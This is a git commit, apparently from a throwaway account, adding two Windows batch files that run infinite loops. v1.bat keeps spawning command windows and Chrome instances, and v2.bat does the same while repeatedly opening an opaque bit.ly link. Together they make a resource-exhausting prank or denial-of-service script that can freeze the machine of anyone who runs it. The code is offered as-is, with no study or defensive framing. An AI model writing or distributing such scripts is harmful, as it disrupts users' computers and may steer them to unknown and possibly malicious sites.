5280ab9957608cc89a641245639d22f8595779fb
ekdhedibdsksjwbdjd292857 <91949977+ekdhedibdsksjwbdjd292857@users.noreply.github.com>
2023-09-25 23:55:34 +0900

    Add files via upload

---
+++ v1.bat
@@ -0,0 +1,11 @@
+@echo off
+:loop
+start
+start chrome
+start
+start chrome
+start
+srart chrome
+start
+start chrome
+goto loop
---
+++ v2.bat
@@ -0,0 +1,24 @@
+@echo off
+:loop
+start chrome
+start chrome
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"
+start
+start chrome "bit.ly/439u0ifnei0fhe0rnriwnkpednf"                              "
+goto loop
